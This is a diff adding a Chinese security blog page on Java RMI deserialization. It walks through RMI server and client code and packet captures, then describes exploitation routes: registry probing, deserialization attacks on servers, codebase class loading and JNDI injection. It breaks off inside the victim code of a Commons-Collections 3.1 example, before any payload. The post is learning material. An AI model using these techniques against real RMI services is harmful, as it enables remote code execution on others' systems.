@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="前言在复现fastjson的过程中看到rmi、LDAP等机制的使用，但一直模模糊糊搞不懂，想来搞清楚这些东西。 但是发现RMI在fastjson中的利用，只是JNDI注入的其中一种利用手段；与RMI本身的反序列化并不是很有关系。 原本想在一篇中整理清楚，由于JNDI注入知识点太过杂糅，将新起一篇说明。 此篇，我们以RMI为主入手，从基础使用开始再到反序列化利用。 RMIRMI（Remote Met">
+<meta name="keywords" content="java">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RMI 反序列化">
+<meta property="og:url" content="http://lalajun.com/2019/10/15/RMI 反序列化/index.html">
+<meta property="og:site_name" content="啦啦菌NODE">
+<meta property="og:description" content="前言在复现fastjson的过程中看到rmi、LDAP等机制的使用，但一直模模糊糊搞不懂，想来搞清楚这些东西。 但是发现RMI在fastjson中的利用，只是JNDI注入的其中一种利用手段；与RMI本身的反序列化并不是很有关系。 原本想在一篇中整理清楚，由于JNDI注入知识点太过杂糅，将新起一篇说明。 此篇，我们以RMI为主入手，从基础使用开始再到反序列化利用。 RMIRMI（Remote Met">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve50dcdsj324t0yre5d.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve2s7e25j31t20v6adl.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve32w49wj321q19qdm5.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve3f8vl7j31rl1aqgs1.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve3nl2egj31om0zpn1i.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1g82em5bejaj31qv0ypwip.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve3vpekvj31sc0rdadg.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve42xmjxj31ua0m0n00.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve4h5x6oj326j0z1795.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve4q4ug8j31n00oc0v8.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve49vrpxj3287100464.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1g7y6plwx8hj31h218wwq0.jpg">
+<meta property="og:updated_time" content="2019-10-18T08:01:10.451Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="RMI 反序列化">
+<meta name="twitter:description" content="前言在复现fastjson的过程中看到rmi、LDAP等机制的使用，但一直模模糊糊搞不懂，想来搞清楚这些东西。 但是发现RMI在fastjson中的利用，只是JNDI注入的其中一种利用手段；与RMI本身的反序列化并不是很有关系。 原本想在一篇中整理清楚，由于JNDI注入知识点太过杂糅，将新起一篇说明。 此篇，我们以RMI为主入手，从基础使用开始再到反序列化利用。 RMIRMI（Remote Met">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve50dcdsj324t0yre5d.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>RMI 反序列化</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/friends/">友链</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2019/09/22/java反序列化-commons-collections/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://lalajun.com/2019/10/15/RMI 反序列化/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://lalajun.com/2019/10/15/RMI 反序列化/&text=RMI 反序列化"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://lalajun.com/2019/10/15/RMI 反序列化/&title=RMI 反序列化"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://lalajun.com/2019/10/15/RMI 反序列化/&is_video=false&description=RMI 反序列化"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=RMI 反序列化&body=Check out this article: http://lalajun.com/2019/10/15/RMI 反序列化/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://lalajun.com/2019/10/15/RMI 反序列化/&title=RMI 反序列化"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://lalajun.com/2019/10/15/RMI 反序列化/&title=RMI 反序列化"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://lalajun.com/2019/10/15/RMI 反序列化/&title=RMI 反序列化"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://lalajun.com/2019/10/15/RMI 反序列化/&title=RMI 反序列化"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://lalajun.com/2019/10/15/RMI 反序列化/&name=RMI 反序列化&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI"><span class="toc-number">2.</span> <span class="toc-text">RMI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI远程对象部署-调用流程"><span class="toc-number">2.1.</span> <span class="toc-text">RMI远程对象部署-调用流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI服务端与客户端实现"><span class="toc-number">2.2.</span> <span class="toc-text">RMI服务端与客户端实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#通讯细节-反序列化"><span class="toc-number">2.3.</span> <span class="toc-text">通讯细节-反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI利用点"><span class="toc-number">2.4.</span> <span class="toc-text">RMI利用点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#直接攻击RMI服务器-Commons-collections3-1"><span class="toc-number">2.5.</span> <span class="toc-text">直接攻击RMI服务器 Commons-collections3.1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        RMI 反序列化
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">啦啦菌NODE</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-10-15T02:05:28.000Z" itemprop="datePublished">2019-10-15</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/java/">java</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在复现fastjson的过程中看到rmi、LDAP等机制的使用，但一直模模糊糊搞不懂，想来搞清楚这些东西。</p>
+<p>但是发现RMI在fastjson中的利用，只是JNDI注入的其中一种利用手段；与RMI本身的反序列化并不是很有关系。</p>
+<p>原本想在一篇中整理清楚，由于JNDI注入知识点太过杂糅，将新起一篇说明。</p>
+<p>此篇，我们以RMI为主入手，从基础使用开始再到反序列化利用。</p>
+<h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p>RMI（Remote Method Invocation），远程方法调用。跟RPC差不多，是java独立实现的一种机制。实际上就是在一个java虚拟机上调用另一个java虚拟机的对象上的方法。</p>
+<p>RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。（我们可以再之后数据包中看到该协议特征）</p>
+<p>在RMI中对象是通过序列化方式进行编码传输的。（我们将在之后证实）</p>
+<p>RMI分为三个主体部分：</p>
+<ul>
+<li>Client-客户端：客户端调用服务端的方法</li>
+<li>Server-服务端：远程调用方法对象的提供者，也是代码真正执行的地方，执行结束会返回给客户端一个方法执行的结果。</li>
+<li>Registry-注册中心：其实本质就是一个map，相当于是字典一样，用于客户端查询要调用的方法的引用。</li>
+</ul>
+<p>总体RMI的调用实现目的就是调用远程机器的类跟调用一个写在自己的本地的类一样。</p>
+<p>唯一区别就是RMI服务端提供的方法，被调用的时候该方法是执行在服务端。</p>
+<blockquote>
+<p>这一点一开始搞不清楚，在攻击利用中糊涂的话会很难受，被调用的方法实际上是在RMI服务端执行。<br>之前认为这一点跟fastjson利用RMI攻击相冲突，因为fastjson的payload是写在攻击者RMI服务器中，但是在实际上是在客户端执行。<br>这两个发生在不同的流程中。我们保持疑问先放一放。</p>
+</blockquote>
+<h3 id="RMI远程对象部署-调用流程"><a href="#RMI远程对象部署-调用流程" class="headerlink" title="RMI远程对象部署-调用流程"></a>RMI远程对象部署-调用流程</h3><p>Server部署部署：</p>
+<ol>
+<li>Server向Registry注册远程对象，远程对象绑定在一个<code>//hostL:port/objectname</code>上，形成一个映射表（Service-Stub）。</li>
+</ol>
+<p>Client调用：</p>
+<ol>
+<li>Client向Registry通过RMI地址查询对应的远程引用（Stub）。这个远程引用包含了一个服务器主机名和端口号。</li>
+<li>Client拿着Registry给它的远程引用，照着上面的服务器主机名、端口去连接提供服务的远程RMI服务器</li>
+<li>Client传送给Server需要调用函数的输入参数，Server执行远程方法，并返回给Client执行结果。</li>
+</ol>
+<h3 id="RMI服务端与客户端实现"><a href="#RMI服务端与客户端实现" class="headerlink" title="RMI服务端与客户端实现"></a>RMI服务端与客户端实现</h3><ol>
+<li>服务端编写一个远程接口</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IRemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(String a)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个接口需要</p>
+<ul>
+<li>使用public声明，否则客户端在尝试加载实现远程接口的远程对象时会出错。（如果客户端、服务端放一起没关系）</li>
+<li>同时需要继承Remote接口</li>
+<li>接口的方法需要生命java.rmi.RemoteException报错</li>
+</ul>
+<ol start="2">
+<li>服务端实现这个远程接口</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">IRemoteHelloWorld</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">RemoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        System.out.println(<span class="string">"构造函数中"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(String a)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"call from"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello world"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个实现类需要</p>
+<ul>
+<li>实现远程接口</li>
+<li>继承UnicastRemoteObject类，貌似继承了之后会使用默认socket进行通讯，并且该实现类会一直运行在服务器上。<br>（如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法的调用UnicastRemoteObject.exportObject()静态方法。）</li>
+<li>构造函数需要抛出一个RemoteException错误</li>
+<li>实现类中使用的对象必须都可序列化，即都继承java.io.Serializable</li>
+</ul>
+<ol>
+<li>注册远程对象</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="comment">//远程接口</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IRemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    	...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//远程接口的实现</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">IRemoteHelloWorld</span></span>&#123;</span><br><span class="line">    	...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//注册远程对象</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//远程对象实例</span></span><br><span class="line">        RemoteHelloWorld h = <span class="keyword">new</span> RemoteHelloWorld();</span><br><span class="line">        <span class="comment">//创建注册中心</span></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">       	<span class="comment">//绑定对象实例到注册中心</span></span><br><span class="line">        Naming.rebind(<span class="string">"//127.0.0.1/Hello"</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//main函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> RMIServer().start();</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>关于绑定的地址很多博客会<em>rmi://ip:port/Objectname</em>的形式<br>实际上看rebind源码就知道<em>RMI:</em>写不写都行;<br>port如果默认是1099，不写会自动补上，其他端口必须写</li>
+</ul>
+<blockquote>
+<p>这里就会想一个问题：注册中心跟服务端可以分离么??????<br>个人感觉在分布式环境下是可以分离的，但是网上看到的代码都没见到分离的，以及官方文档是这么说的：</p>
+<p><em>出于安全原因，应用程序只能绑定或取消绑定到在同一主机上运行的注册中心。这样可以防止客户端删除或覆盖服务器的远程注册表中的条目。但是，查找操作是任意主机都可以进行的。</em></p>
+<p>那么就是一般来说注册中心跟服务端是不能分离的。但是个人感觉一些实际分布式管理下应该是可以的，这对我们攻击流程不影响，不纠结与此。</p>
+</blockquote>
+<p>那么服务端就部署好了，来看客户端</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrainMain</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld) Naming.lookup(<span class="string">"rmi://127.0.0.1:1099/Hello"</span>);</span><br><span class="line">        String ret = hello.hello(<span class="string">"input!gogogogo"</span>);</span><br><span class="line">        System.out.println( ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>需要使用远程接口（此处是直接引用服务端的类，客户端不知道这个类的源代码也是可以的，重点是包名，类名必须一致，serialVersionUID一致）</li>
+<li>Naming.lookup查找远程对象，<em>rmi:</em>也可省略</li>
+</ul>
+<p>那么先运行服务端，再运行客户端，就可以完成调用</p>
+<h3 id="通讯细节-反序列化"><a href="#通讯细节-反序列化" class="headerlink" title="通讯细节-反序列化"></a>通讯细节-反序列化</h3><p>但是我们需要分析具体通讯细节，来加深了解RMI：<br>下面使用wireshark抓包查看数据。</p>
+<p>由于自己抓包有混淆数据进入，不好看，总体流程引用<code>java安全漫谈-RMI篇</code>的数据流程图，再自己补充细节</p>
+<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve50dcdsj324t0yre5d.jpg" alt="总体数据包.png"></p>
+<p>我把总体数据包，分成以下四块：</p>
+<ol>
+<li>客户端与注册中心（1099端口）建立通讯；<br>客户端查询需要调用的函数的远程引用，注册中心返回远程引用和提供该服务的服务端IP与端口</li>
+</ol>
+<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve2s7e25j31t20v6adl.jpg" alt="1.1_call.png"></p>
+<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve32w49wj321q19qdm5.jpg" alt="1.2_return.png"></p>
+<blockquote>
+<p><code>AC ED 00 05</code>是常见的java反序列化16进制特征<br>注意以上两个关键步骤都是使用序列化语句</p>
+</blockquote>
+<ol start="2">
+<li>客户端新起一个端口与服务端建立TCP通讯<br>客户端发送远程引用给服务端，服务端返回函数唯一标识符，来确认可以被调用(此处返回结果的含义打上问号，猜测大概是这个意思)</li>
+</ol>
+<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve3f8vl7j31rl1aqgs1.jpg" alt="2.1.png"></p>
+<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve3nl2egj31om0zpn1i.jpg" alt="2.2.png"></p>
+<p>同样使用序列化的传输形式</p>
+<p>以上两个过程对应的代码是这一句（猜测不一定）<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld) Naming.lookup(<span class="string">"rmi://127.0.0.1:1099/Hello"</span>);</span><br></pre></td></tr></table></figure></p>
+<p>这里会返回一个PROXY类型函数（由于是之后补的图，代码不一样）</p>
+<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g82em5bejaj31qv0ypwip.jpg" alt="lookup结果.png"></p>
+<ol start="3">
+<li><p>客户端与注册中心（1099端口）通讯，不知道在做啥</p>
+</li>
+<li><p>客户端序列化传输调用函数的输入参数至服务端<br>服务端返回序列化的执行结果至客户端</p>
+</li>
+</ol>
+<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve3vpekvj31sc0rdadg.jpg" alt="3.1.png"></p>
+<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve42xmjxj31ua0m0n00.jpg" alt="3.2.png"></p>
+<p>以上调用通讯过程对应的代码是这一句<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String ret = hello.hello(<span class="string">"input!gogogogo"</span>);</span><br></pre></td></tr></table></figure></p>
+<p>可以看出所有的数据流都是使用序列化传输的，我们尝试从代码中找到对应的反序列化语句</p>
+<p>RMI客户端发送调用函数输入参数的序列化过程，接受服务端返回内容的反序列化语句位置分别如下：</p>
+<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve4h5x6oj326j0z1795.jpg" alt="客户端-服务端readObject().png"></p>
+<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve4q4ug8j31n00oc0v8.jpg" alt="客户端-服务端writeObject().png"></p>
+<p>RMI服务端与客户端readObject其实位置是同一个地方，只是调用栈不同，位置如下：</p>
+<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve49vrpxj3287100464.jpg" alt="服务端ReadObject().png"></p>
+<h3 id="RMI利用点"><a href="#RMI利用点" class="headerlink" title="RMI利用点"></a>RMI利用点</h3><p>那么我们可以确定RMI是一个基于序列化的java远程方法调用机制。我们来思考这个过程存在的漏洞点：</p>
+<ol>
+<li>控制？探测利用RMI服务</li>
+</ol>
+<p>可以看到我们可以使用rebind、 bind、unbind等方法，去在注册中心中注册调用方法。那我们是不是可以恶意去注册中心注册恶意的远程服务呢？</p>
+<p>实际上是不行的。</p>
+<p>RMI注册中心只有对于来源地址是localhost的时候，才能调用rebind、 bind、unbind等方法。<br>不过list和lookup方法可以远程调用。</p>
+<p>list方法可以列出目标上所有绑定的对象：<br><code>String[] s = Naming.list(&quot;rmi://192.168.135.142:1099&quot;);</code></p>
+<p>lookup作用就是获得某个远程对象。<br>如果对方RMI注册中心存在敏感远程服务，就可以进行探测调用（<a href="https://github.com/NickstaDB/BaRMIe" target="_blank" rel="noopener">BaRMIE工具</a></p>
+<ol start="2">
+<li>直接攻击RMI服务器</li>
+</ol>
+<p>他的RMI服务端存在readObject反序列化点。从通讯过程可知，服务端会对客户端的任意输入进行反序列化。<br>如果服务端存在漏洞组件版本（存在反序列化利用链），就可以对RMI服务接口进行反序列化攻击。<br>（讲道理由于客户端同样存在ReadObject反序列化点，恶意服务端也可以打客户端，但是实际场景几乎不可能存在，就不复现了）</p>
+<ol start="3">
+<li>动态加载恶意类</li>
+</ol>
+<p>上面没有说到：<br>RMI核心特点之一就是动态类加载。<br>RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类。<br>如果当前JVM中没有某个类的定义，它可以根据codebase去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管。</p>
+<p>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类；CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。</p>
+<p>如果我们指定 codebase=<a href="http://example.com/" target="_blank" rel="noopener">http://example.com/</a> ，然后加载 org.vulhub.example.Example 类，<br>则Java虚拟机会下载这个文件<a href="http://example.com/org/vulhub/example/Example.class，并作为" target="_blank" rel="noopener">http://example.com/org/vulhub/example/Example.class，并作为</a> Example类的字节码。</p>
+<p>那么只要控制了codebase，就可以加载执行恶意类。同时也存在一定的限制条件：</p>
+<ul>
+<li>安装并配置了SecurityManager</li>
+<li>Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false</li>
+</ul>
+<p>java.rmi.server.useCodebaseOnly 配置为 true 的情况下，Java虚拟机将只信任预先配置好的 codebase ，不再支持从RMI请求中获取。<br>具体细节在java安全漫谈-05 RMI篇（2）一文中有描述。<br>这边暂时只是讲述有这个漏洞原理，由于未找到真实利用场景，不细说。</p>
+<ol start="4">
+<li>JNDI注入</li>
+</ol>
+<p>RMI服务端在绑定远程对象至注册中心时，不只是可以绑定RMI服务器本身上的对象，还可以使用Reference对象指定一个托管在第三方服务器上的class文件，再绑定给注册中心。<br>在客户端处理服务端返回数据时，发现是一个Reference对象，就会动态加载这个对象中的类。<br>攻击者只要能够</p>
+<ol>
+<li>控制RMI客户端去调用指定RMI服务器</li>
+<li>在可控RMI服务器上绑定Reference对象，Reference对象指定远程恶意类</li>
+<li>远程恶意类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码</li>
+</ol>
+<p>就可以达到RCE的效果。</p>
+<p>有关JNDI注入，以及其fastjson反序列化的例子相关知识太多。这篇只是引出，暂不表述。</p>
+<h3 id="直接攻击RMI服务器-Commons-collections3-1"><a href="#直接攻击RMI服务器-Commons-collections3-1" class="headerlink" title="直接攻击RMI服务器 Commons-collections3.1"></a>直接攻击RMI服务器 Commons-collections3.1</h3><p>举例Commons-collection利用rmi调用的例子。</p>
+<p>RMI服务端(受害者)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">name</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">        <span 